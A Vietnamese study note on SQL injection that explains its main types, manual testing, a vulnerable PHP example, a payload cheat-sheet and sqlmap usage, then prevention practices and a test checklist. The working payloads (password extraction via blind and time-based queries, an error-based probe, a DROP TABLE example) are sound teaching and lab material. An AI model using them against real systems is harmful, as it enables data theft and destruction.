# 1) Định nghĩa ngắn

**SQL Injection (SQLi)** là lỗi do ứng dụng chèn dữ liệu không đáng tin cậy trực tiếp vào query, cho phép attacker thay đổi cấu trúc truy vấn và đọc/sửa/xóa dữ liệu, hoặc thậm chí chạy lệnh RCE.


# 2) Các dạng chính (với ý tưởng cơ bản)

1. **Error-based SQLi**
   * Kích thích DB trả lỗi chứa dữ liệu để rút thông tin.

2. **Union-based SQLi**
   * Dùng `UNION SELECT` để nối kết quả do attacker kiểm soát vào kết quả hợp lệ.

3. **Boolean-based (Blind) SQLi**
   * Khi attacker chèn biểu thức trả về TRUE/FALSE vào tham số (ví dụ `id=1 AND 1=1` vs `id=1 AND 1=2`) và suy ra dữ liệu từ sự khác biệt trong phản hồi. Khắc phục bằng prepared statements, whitelist input và giảm quyền DB.

4. **Time-based (Blind) SQLi**
   * Kỹ thuật khiến DB ngủ (ví dụ SLEEP(5) hoặc pg_sleep(5)) khi một điều kiện đúng, rồi đo thời gian phản hồi để dò dữ liệu; khắc phục bằng prepared statements, validate input và giới hạn/quyền DB.

5. **Stacked queries**
   * Chèn nhiều câu SQL trong một request (ví dụ ; DROP TABLE users;) có thể gây xóa dữ liệu hoặc RCE; ngăn bằng prepared statements, tắt multi-statement client option và giới hạn quyền DB.

6. **Out-of-band (OOB) SQLi**
   * Kỹ thuật khiến DB gửi request ra ngoài (DNS/HTTP) để exfiltrate dữ liệu — phòng ngừa bằng egress filtering, vô hiệu hoá hàm mạng trên DB, least-privilege và chuẩn hoá/parametrize queries.

7. **Second-order SQLi**
   * Xảy ra khi payload độc hại được lưu trước rồi kích hoạt sau khi app dùng lại dữ liệu ấy trong một câu SQL không an toàn, gây injection.

# 3) Cách nhận biết / test nhanh (manual)

* Thử ký tự đặc biệt: `' " -- ; /*` xem app phản ứng (lỗi, khác nội dung).
* Thử điều kiện boolean trong parameter: `id=1 AND 1=1` vs `id=1 AND 1=2` → quan sát khác biệt.
* Thử `UNION SELECT` (bắt đầu từ 1 cột → tăng cột: `UNION SELECT NULL` ... tìm số cột).
* Kiểm tra phản hồi thời gian: thêm payload gây delay để phát hiện time-based blind.
* Tìm lỗi DB (stack traces) trong response.
* Sử dụng proxy (Burp) để thử payloads và xem responses chi tiết.


# 4) Ví dụ minh hoạ (an toàn, để hiểu cơ chế)

Giả sử ứng dụng thực hiện (vulnerable) trong PHP:

```sql
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];
```

* Nếu attacker gửi `?id=1 OR 1=1` → câu SQL thành:
  `SELECT * FROM users WHERE id = 1 OR 1=1` => trả về toàn bộ users.

Union-based example (để trích cột):

* `?id=1 UNION SELECT username, password FROM users --`
  (Phải đúng số cột & kiểu dữ liệu.)

Boolean blind example:

* `?id=1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1) = 'a'`
  → nếu page khác khi điều kiện đúng → suy ra ký tự.

Time-based example (MySQL):

* `?id=1 AND IF(SUBSTR((SELECT password FROM users WHERE id=1),1,1)='a', SLEEP(5), 0)`
  → nếu response chậm 5s → ký tự là 'a'.


# 5) Một số payload tham khảo (cheat-sheet, dùng trong lab)

* Basic test: `' OR '1'='1`
* Error-based probe: `' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT user),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- `
* Union probe: `1 UNION SELECT NULL,NULL,... -- ` (tăng số NULL theo số cột)
* Boolean blind: `1 AND SUBSTRING((SELECT database()),1,1)='a'`
* Time-based (MySQL): `1 AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a', SLEEP(5), 0)`
* MSSQL sleep: `; IF (SUBSTRING((SELECT TOP 1 password FROM users),1,1)='a') WAITFOR DELAY '00:00:05'--`

> **Ghi chú:** payloads phức tạp dễ bị block; dùng Burp Intruder hoặc sqlmap để tự động hóa trong lab.


# 6) Dò tự động — công cụ tiêu biểu

* **sqlmap**: tự động hóa discovery + exploitation. Ví dụ (lab/target được phép):

  ```
  sqlmap -u "http://target/vuln.php?id=1" --risk=3 --level=5 --dbs
  ```
* **Burp Suite** (Intruder/Repeater) + wordlists/custom payloads.
* **Nikto**, **Nmap scripts** cho reconnaissance.


# 7) Phòng ngừa (best practices — phải nắm cho phỏng vấn)

1. **Prepared statements / parameterized queries** — luôn dùng (PDO, prepared statement, ORM).
2. **Use of ORMs** with parameter binding (nhưng vẫn cần kiểm tra chỗ raw SQL).
3. **Input validation & allowlist** — validate type/length/format; nhưng không dùng validation thay cho parameterized queries.
4. **Least privilege DB user** — web app chỉ có quyền cần thiết (không dùng root).
5. **Escaping / encoding** chỉ như phương án phụ, không thay cho parameterized queries.
6. **Stored procedures** cũng phải dùng parameter binding; tránh concat SQL trong SP.
7. **WAF / IPS** là lớp phòng thủ bổ sung (không thay cho code đúng).
8. **Error handling**: hide DB error details (no stack traces to users).
9. **Logging & monitoring**: log suspicious patterns, rate-limit, alert.
10. **Dependency & framework patching**: cập nhật driver/DB libraries.


# 8) Checklist kiểm thử/patch (quick)

*  Tìm mọi input có thể điều khiển truy vấn (params, headers, cookies, body).
*  Thử các loại payloads: error, union, boolean, time-based.
*  Kiểm tra multi-byte/encoding (UTF-8), bypass filters.
*  Kiểm tra stored/second-order injection (input lưu -> dùng sau).
*  Kiểm tra quyền DB: có thể đọc `information_schema`? có thể ghi/xóa?
*  Xác minh fix: replace vulnerable code bằng prepared statements + viết unit/integration tests.


# 9) Tài liệu/nguồn ôn (khuyến nghị)

* OWASP SQL Injection Prevention Cheat Sheet.
* PortSwigger Labs (Web Security Academy) — practice labs.
* sqlmap docs & Burp Suite Academy.
